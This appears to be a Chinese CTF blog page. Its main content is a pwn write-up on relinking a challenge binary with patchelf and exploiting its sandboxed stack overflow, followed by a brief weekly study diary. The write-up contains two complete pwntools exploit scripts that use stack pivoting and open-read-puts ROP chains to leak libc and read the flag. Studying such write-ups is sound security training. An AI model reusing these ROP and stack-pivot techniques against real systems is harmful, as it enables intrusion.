<p><a target="_blank" rel="noopener" href="https://github.com/NixOS/patchelf?tab=readme-ov-file">NixOS&#x2F;patchelf：一个修改 ELF 可执行文件的动态链接器和 RPATH 的小实用程序 — NixOS&#x2F;patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)</a></p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427093915945.png" alt="image-20240427093915945"></p>
<p>老规矩拿到题目先checksec一下</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427094139743.png" alt="image-20240427094139743"></p>
<p>这里有一个问题在于在于这里的checksec比正常的多了最后一个，这个是我自己加上的，在拿到题目直接checksec只会有前5个，这第6个便是使用上文的patchelf工具将这个题目的libc链接库改到题目给的2.23版本后checksec的结果</p>
<p>在这里由于远程提供的是2.23的libc版本，所以这道题的编译环境也是这个版本，由于在不同版本中其对于不同漏洞的机制是不同的，所以有的漏洞在特定的版本上能打通在有的过高的版本就打不同，像这道题我写的脚本打本地就是打不通的，但一旦换到远程就可以打通。所以以后再遇到题目提供的libc版本与本地的版本并不同的时，最好在一开始就将文件的调用的libc版本从本地的换到与远程相同的版本。</p>
<p>这道题在我这里的更换命令如下,各位师傅可以更具自己的电脑进行更改。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter /home/wzg/tools/glibc_all_in_one/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64/ld-<span class="number">2.23</span>.so --<span class="built_in">set</span>-rpath  /home/wzg/tools/glibc_all_in_one/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.23</span>-0ubuntu11<span class="number">.3</span>_amd64 bs</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>好那现在便将这个程序拖入到ida中</p>
<p>先看main函数：</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427101015015.png" alt="image-20240427101015015"></p>
<p>就两个函数那就一个一个点进去看，先看第一个</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427101105315.png" alt="image-20240427101105315"></p>
<p>那这样就很明显这道题是有沙箱保护的，那就再看沙箱有哪些保护</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427101401242.png" alt="image-20240427101401242"></p>
<p> 这个沙箱保护有一个很扯的地方在于对于execve函数他并没有禁止，而是禁止了exit_group这个函数，所以好像理论上来说好像可以通过执行<code>system(/bin/sh)</code>拿到shell，但是我在之后发现并不能这样，他在执行system函数时会出现一些问题， 还是无法解决的那种，所以这道题还是得用orw的方法解决。</p>
<p>现在再看main函数中的另外一个函数内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssize_t func()</span><br><span class="line">&#123;</span><br><span class="line">  char buf[<span class="number">320</span>]; // [rsp+0h] [rbp-140h] BYREF</span><br><span class="line"></span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(<span class="string">&quot;please enter your content:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, 0x150uLL);</span><br><span class="line">  printf(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  puts(<span class="string">&quot;please enter your content again:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, 0x150uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显了，这连续两个的栈溢出虽然溢出的比较小，但也足够进行栈迁移了，并且第一个地方还会把输入的都打印出来，在结合溢出便可以将ebp的值暴露出来，从而得到栈上的地址，然后在第二个栈溢出这里将执行权通过栈迁移将其迁移到栈上。</p>
<p>现在开始详细分析，</p>
<p>在第一个输入数据的那里可以进行一定的栈溢出，但程度很少，只够栈迁移的量，并且在之后的地方程序会把这里输入的都打印出来，虽然这个打印的没有格式化字符串漏洞，但是依然有一个漏洞。</p>
<p>这里用 <code>printf(&quot;%s&quot;, buf);</code>将输入到buf的数据打印出来。但这又个问题在于其对于结束打印的鉴定在于是否遇到\x00这个数据，如果遇到这个变会结束打印，反之如果不能遇到这个变会一直打印下去，知道遇到这个数据，于是我我们便可以直接向程序中注入0x140的长度的数据使其直接覆盖到ebq的位置，由于其在ebp的位置之前全部都被覆盖为垃圾数据，程序变回一直打连ebp所指的数据一同暴露，</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427110159088.png" alt="image-20240427110159088"></p>
<p>在这里可以看到ebp所指的值也是一个栈上的地址，在找到程序输入的地址rsp所指的地方。</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427110628309.png" alt="image-20240427110628309"></p>
<p>便可以找到这两个数据的距离差为多少，0x7fffffffde60-0x7fffffffdd10&#x3D;0x150</p>
<p>这样便可以知道栈的地址，在第二个输入的地方将程序执行权挟持到输入的数据的最开始执行我们输入的命令，</p>
<p>现在变可以在第二个输入的地方用puts函数将puts函数的got表的地址打印出来，然后使用read函数将orw的命令输入的一个bss段上的空地址，之后再将程序通过后栈迁移，迁移到存放orw的bss段地址上，执行orw将flag输出到屏幕上。这个是我对这道题的解法，有些麻烦，并且有的地方要整好多寄存器才行，就想在打开read函数时要将rdi的值代为0才能将我们输入的数据输入到bss段中（就这一个寄存器我调了2天才发现这个问题）。</p>
<p>后来因为我一开始并没有将这个题的链接库改到2.23的版本所以在自己做的时候，一直没打通问了学长，学长自己写了一个与我这种思路并不同的payload，之后将重点将那个payload，这里也将我自己的这种放上去，简单分析一下。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./bs&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;competition.blue-whale.me&quot;,20082)</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *0x400B0B&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">leave=<span class="number">0x400B09</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x400b93</span></span><br><span class="line">read_plt=<span class="number">0x400830</span></span><br><span class="line">puts_plt=<span class="number">0x4007E0</span></span><br><span class="line">puts_got=<span class="number">0x601028</span></span><br><span class="line">read_got=<span class="number">0x601050</span></span><br><span class="line"></span><br><span class="line">buf=<span class="number">0x601680</span>//这里是bss段上的空地址</span><br><span class="line">ret=<span class="number">0x400799</span></span><br><span class="line">pop_rsi_pop_r15_ret=<span class="number">0x400b91</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x4008d0</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret=<span class="number">0x400B8A</span> </span><br><span class="line">csu_init=<span class="number">0x400B70</span>//这个和上面一个都是__libc_csu_init中的全能寄存器修改器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x13f</span>+<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">ebp=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;ebp: &#x27;</span>,<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">rsp=ebp-<span class="number">0x150</span>//rsp的值便是栈上数据的注入地址</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;rsp: &#x27;</span>,<span class="built_in">hex</span>(rsp))</span><br><span class="line">tiao=ebp-<span class="number">0xb0</span>//在之后改read函数的寄存器是使用的那个init的跳转地址</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;tiao: &#x27;</span>,<span class="built_in">hex</span>(tiao))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(ret)+p64(puts_plt)</span><br><span class="line">//打印libc地址</span><br><span class="line">payload+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(tiao)</span><br><span class="line">payload+=p64(<span class="number">0xc0</span>)+p64(buf)+p64(<span class="number">0</span>)+p64(csu_init)+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload+=p64(ret)+p64(pop_rbp_ret)+p64(<span class="number">1</span>)+p64(read_plt)</span><br><span class="line">//将rdi的值设为<span class="number">0</span>，rsi设为bss段的空地址，rdx设为要读取的数据，rbp设为<span class="number">0</span>，然后调用read函数</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(buf)+p64(leave)</span><br><span class="line">//现将要跳转的地址赋给rbp然后调用leave便可以使程序跳转到那个地址</span><br><span class="line">payload=payload.ljust(<span class="number">0x140</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload+=p64(rsp)+p64(leave)</span><br><span class="line">//将ebp覆盖为输入的地址，然后leave调到那</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;again:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;puts: &#x27;</span>,<span class="built_in">hex</span>(puts))</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elo=ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">open_libc=elo.symbols[<span class="string">&#x27;open&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_libc=elo.symbols[<span class="string">&#x27;puts&#x27;</span>]    </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;puts_libc: &#x27;</span>,<span class="built_in">hex</span>(puts_libc))</span><br><span class="line">sys_libc=elo.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs = <span class="built_in">next</span>(elo.search(<span class="built_in">bytes</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">base_libc=puts-puts_libc</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;base_libc: &#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line">system=sys_libc+base_libc</span><br><span class="line">binsh=bs+base_libc</span><br><span class="line"><span class="built_in">open</span>=open_libc+base_libc</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;binsh: &#x27;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">buf_flag=<span class="number">0x601780</span>//在orw中放flag的空地址</span><br><span class="line"></span><br><span class="line">pop_rsi_pop_r15_ret=<span class="number">0x400b91</span></span><br><span class="line">pop_rdx_pop_r12_ret_libc=<span class="number">0x11f2e7</span></span><br><span class="line">pop_rdx_pop_r12_ret=pop_rdx_pop_r12_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdx_ret_libc=<span class="number">0x1b92</span></span><br><span class="line">pop_rdx_ret=pop_rdx_ret_libc+base_libc</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=b&#x27;A&#x27;*8+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rsi_pop_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(buf)+p64(pop_rbp_ret)+p64(<span class="number">1</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">payload+=p64(pop_rsi_pop_r15_ret)+p64(buf_flag)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(<span class="number">1</span>)+p64(read_plt)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(buf_flag)+p64(puts_plt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>以上这个便是我自己的payload，很明显有多有乱，虽然能打通但在真实的比赛中这个太多了，整完这题后面的就没什么时间了。所以必须要简化，现在来看看学长的payload</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427114528647.png" alt="image-20240427114528647"></p>
<p>那现在来看看学长写的这个payload，先讲我对这个的理解。</p>
<p>在第一个溢出中我们可以通过溢出将ebp的值覆盖，然后还可以再溢出8个字节的位置，对于这剩下的一个位置我们可以选择像之前我的那个一样进行栈迁移，还一种便是回到程序中的某一个位置之后从这个位置执行下去，在这里学长选择得便是第二种，</p>
<p>那既然能改ebp的值那现在便要找一个可以用这个的地方，回到汇编语句中来看</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427144335842.png" alt="image-20240427144335842"></p>
<p>仔细看在printf函数调用之前对于寄存器的管理，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea     rax, [rbp+buf]</span><br><span class="line">mov     rsi, rax</span><br><span class="line">mov     edi, offset format ; <span class="string">&quot;%s&quot;</span></span><br><span class="line">mov     eax, <span class="number">0</span></span><br><span class="line">call    _printf</span><br></pre></td></tr></table></figure>

<ol>
<li><p>先将rbp的值加上buf，这里buf就是指buf这个变量的大小（-0x140），然后将rbp+（-0x140）的值赋给rax寄存器</p>
</li>
<li><p>将rax的值赋给rsi寄存器</p>
</li>
<li><p>将”%s”赋给edi，再将eax的值清零，</p>
</li>
<li><p>最后调用printf函数，</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427153721575.png" alt="image-20240427153721575"></p>
<p>（关于这里为什么会是-0x140，我是不是很清楚，但点进buf显示的便是如此，同时在gdb中查看这一段地址也是如此，-0x140）</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/image-20240427153822619.png" alt="image-20240427153822619"></p>
</li>
</ol>
<p>详细来说就是在printf函数调用之前将edi赋值为%s，将rsi赋值为rbp-0x140的值，然后通过printf函数将rsi所指的rbp-0x140的地址的值打印出来，而我们在之前的时候可以通过栈溢出将ebp（ebp与rbp是同一个寄存器，不过ebp是rbp的后面一半的位，不过大多时候用不到不同的位置，故可以混用）的值覆盖，那这里我们便可以通过栈溢出将ebp的指覆盖为某个函数的got表的地址+0x140，然后再后面输入上面这个代码的地址，执行这段地址便可以将这个函数的got表的地址打印出来，然后便可以知道程序的libc基地址。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ayload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x140</span> + p64(got +<span class="number">0x140</span>) + p64(<span class="number">0x400ACC</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;please enter your content:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;please enter your content again:&quot;</span>,<span class="string">b&quot;AAA&quot;</span>)//第二个栈溢出随便输入几个数据过去就行</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">libcbase=libcbase-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbse=================================================+&gt;&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>



<p>那这样程序的执行便回到printf函数这里，并且在之后还有一次栈溢出的机会，</p>
<p><strong>有一个很重要的事，自从我们将ebp的值覆盖为got+0x140的值后，一直执行的命令中并没有改变ebp的值的命令，故在后面包括read函数执行的时候对ebp的调用依然是不变的</strong></p>
<p>继续往后面执行执行到read的时候看看</p>
<p><img src="/2024/04/26/patchelf%E4%BD%BF%E7%94%A8%E5%92%8C%E4%BE%8B%E9%A2%98/%7BF322C214-C938-49FC-BE01-68C41DDF310D%7D-17142042888402.png" alt="{F322C214-C938-49FC-BE01-68C41DDF310D}"></p>
<p>由于ebp在前期的执行中并没有被改变，故执行到这里时依然是got+0x140的值，然后根据调用read函数前的命令，在执行read时rsi寄存器的值被改变为got的值，故这里的read函数读入的数据并不存放在栈上，而是存放在got的地址及其之后，并且ebp所指向的值为got+0x140。</p>
<p>然后便可以将orw通过read函数直接注入到got的地址上，然后注入的剩下垃圾数据到0x140，在将ebp指向的数据覆盖成got-8的地址，然后调用leave，指程序栈迁移到存放orw的地址，然后执行就可以拿到flag</p>
<p>全部的paylaod如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./bs&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bs&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">put_plt = <span class="number">0x4007E0</span></span><br><span class="line">rdi = <span class="number">0x400b93</span></span><br><span class="line">got = <span class="number">0x601058</span></span><br><span class="line"></span><br><span class="line">bss = elf.bss() - <span class="number">0x8</span> + <span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;elf.bss(): &#x27;</span>,<span class="built_in">hex</span>(elf.bss()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;============================&gt;&quot;</span>,<span class="built_in">hex</span>(bss))</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x140</span> + p64(got +<span class="number">0x140</span>) + p64(<span class="number">0x400ACC</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b *0x400B09&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;please enter your content:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;please enter your content again:&quot;</span>,<span class="string">b&quot;AAA&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">libcbase=libcbase-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbse=================================================+&gt;&quot;</span>,<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;open_addr: &#x27;</span>,<span class="built_in">hex</span>(open_addr))</span><br><span class="line">read_addr = <span class="number">0x400830</span></span><br><span class="line">printf = <span class="number">0x400810</span></span><br><span class="line">leave = <span class="number">0x400B09</span></span><br><span class="line">rdx = <span class="number">0x1b92</span> + libcbase</span><br><span class="line">rsi = libcbase + <span class="number">0x00000000000202f8</span></span><br><span class="line"></span><br><span class="line">payload = p64(rdi) + p64(got + <span class="number">0x78</span> + <span class="number">0x10</span>) + p64(rsi) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload+=p64(rdx) + p64(<span class="number">0x0</span>) + p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(rdi) + p64(<span class="number">0x3</span>) + p64(rsi) + p64(bss + <span class="number">0x200</span>) + p64(rdx) + p64(<span class="number">0x30</span>) + p64(read_addr) + p64(rdi) + p64(bss+<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(put_plt) + <span class="string">b&quot;flag\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x140</span>,<span class="string">b&quot;A&quot;</span>) </span><br><span class="line">payload += p64(got - <span class="number">0x8</span>) + p64(leave) </span><br><span class="line">io.sendafter(<span class="string">&quot;please enter your content again:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这样便是完整的payload，很明显学长的这个比我的要少了很多，而这个的关键就在与对ebp的使用，从一开始溢出将其覆盖之后，后面便一直在利用这个被覆盖的ebp完成libc的暴露与orw的迁移。</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn%E5%B7%A5%E5%85%B7/" rel="tag">pwn工具</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/pwn/">pwn</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-周报（2024-4-15-2024-4-21）" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/21/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-15-2024-4-21%EF%BC%89/" class="article-date">
  	<time datetime="2024-04-21T14:01:40.000Z" itemprop="datePublished">2024-04-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/04/21/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-15-2024-4-21%EF%BC%89/">
        周报（2024.4.14-2024.4.21）
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>行吧，一周又过去了，又来写周报了，</p>
<p>这周主要的还是在整堆的知识点（仔细看看好像学的也不算太多），prev size的复用，物理链表，逻辑链表，其他的就学的不算太好了，这周还的再仔细看看。（基础知识学起来是真的痛，破学校又要搞什么运动会训练，SB田文镜学校，课程也多，好痛啊，这周要早点睡，多整点时间学）</p>
<p><img src="/2024/04/21/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-15-2024-4-21%EF%BC%89/image-20240421221502402.png" alt="image-20240421221502402"></p>
<p>然后周末的时候打了一个还算简单的比赛，虽然3道题都是栈的，可惜比赛的时候一道也没做出来，好久没认真做题手都有一点生疏了，以后要找点时间多多练练，熟能生巧。</p>
<p>到写这篇文章的只做出来一题，早点把wp写完好好总结一下都踩哪些坑了，这周看看尽量把剩下的两道题在这周复现出来。</p>
<p>好吧，这周的周报到此结束，下周再见。</p>
<p><img src="/2024/04/21/%E5%91%A8%E6%8A%A5%EF%BC%882024-4-15-2024-4-21%EF%BC%89/image-20240421222304184.png" alt="image-20240421222304184"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%A8%E6%8A%A5/" rel="tag">周报</a></li></ul>
	</div>

      
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/%E5%91%A8%E6%8A%A5/">周报</a>
	</div>


      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-DASCTF-X-GFCTF-2024｜四月开启第一局" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/04/21/DASCTF-X-GFCTF-2024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/" class="article-date">
  	<time datetime="2024-04-21T12:41:04.000Z" itemprop="datePublished">2024-04-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
